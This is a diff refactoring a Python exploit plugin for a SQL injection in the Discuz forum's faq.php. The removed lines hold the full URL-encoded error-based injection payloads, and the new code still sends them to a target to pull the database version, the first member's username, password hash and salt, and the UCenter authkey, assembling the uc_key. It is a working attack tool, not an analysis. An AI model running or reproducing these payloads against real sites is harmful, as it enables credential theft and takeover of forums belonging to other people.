@@ -1,39 +1,52 @@
-#!/usr/bin/env python
-# coding: utf-8
-# Date  : 2018-07-12 17:12:55
-# Author: b4zinga
-# Email : b4zinga@outlook.com
-# Func  :
-
 import re
+from typing import Optional
+
 import requests
 
+from lib.log import logger
+from plugins.package.payloads import (
+    PAYLOAD_DB_VERSION,
+    PAYLOAD_GET_USER_PWD_SALT,
+    PAYLOAD_GET_KEY1,
+    PAYLOAD_GET_KEY2,
+)
 
-def getInfo(text):
-    regex = "Duplicate entry '(.*?)'"
+
+def get_info(text: str) -> str:
+    """Extract information from response text using regex."""
+    regex = r"Duplicate entry '(.*?)'"
     items = re.findall(regex, text)
-    if items:
-        return items[0]
-    else:
-        return "Can't found..."
+    return items[0] if items else "Can't found..."
 
 
-def run(url):
-    payload_db_version = '/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20information_schema%20.tables%20group%20by%20x)a)%23'
-    req = requests.get(url + payload_db_version, timeout=5, verify=False)
-    print('[+] Discuz faq.php sql vulnerable ~ ')
-    print('[+] MySql version: ' + getInfo(req.text))
+def run(url: str) -> Optional[str]:
+    """Exploit SQL injection vulnerability in Discuz faq.php."""
+    try:
+        # Check database version
+        logger.info("Checking MySQL version")
+        response = requests.get(url + PAYLOAD_DB_VERSION, timeout=5, verify=False)
+        logger.success("[+] Discuz faq.php SQL vulnerable ~")
+        mysql_version = get_info(response.text)
+        logger.info(f"[+] MySQL version: {mysql_version}")
 
-    payload_get_user_pwd_salt = '/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%20concat%28username,0x3a,password,0x3a,salt%29%20from%20cdb_uc_members%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23'
-    req = requests.get(url + payload_get_user_pwd_salt, timeout=5, verify=False)
-    print('[+] username:password:salt -> ' + getInfo(req.text))
+        # Get username, password, and salt
+        logger.info("Retrieving username:password:salt")
+        response = requests.get(url + PAYLOAD_GET_USER_PWD_SALT, timeout=5, verify=False)
+        user_pwd_salt = get_info(response.text)
+        logger.info(f"[+] username:password:salt -> {user_pwd_salt}")
 
-    payload_get_key1 = '/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),0x3a,(select%20substr(authkey,1,62)%20from%20cdb_uc_applications%20limit%200,1),0x3a)x%20from%20information_schema.tables%20group%20by%20x)a)%23'
-    payload_get_key2 = '/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),0x3a,(select%20substr(authkey,63,64)%20from%20cdb_uc_applications%20limit%200,1),0x3a)x%20from%20information_schema.tables%20group%20by%20x)a)%23'
+        # Get auth key parts
+        logger.info("Retrieving auth key part 1")
+        response1 = requests.get(url + PAYLOAD_GET_KEY1, timeout=5, verify=False)
+        logger.info("Retrieving auth key part 2")
+        response2 = requests.get(url + PAYLOAD_GET_KEY2, timeout=5, verify=False)
 
-    req1 = requests.get(url + payload_get_key1, timeout=5, verify=False)
-    req2 = requests.get(url + payload_get_key2, timeout=5, verify=False)
-
-    uck = getInfo(req1.text)[2:] + getInfo(req2.text)[2:-1]
-
-    return 'uc_key: '+ uck  # 62 + 2
+        uc_key = get_info(response1.text)[2:] + get_info(response2.text)[2:-1]
+        logger.success(f"uc_key: {uc_key}")
+        return f"uc_key: {uc_key}"
+    except requests.RequestException as e:
+        logger.error(f"Request failed: {str(e)}")
+        return None
+    except Exception as e:
+        logger.error(f"Unexpected error: {str(e)}")
+        return None
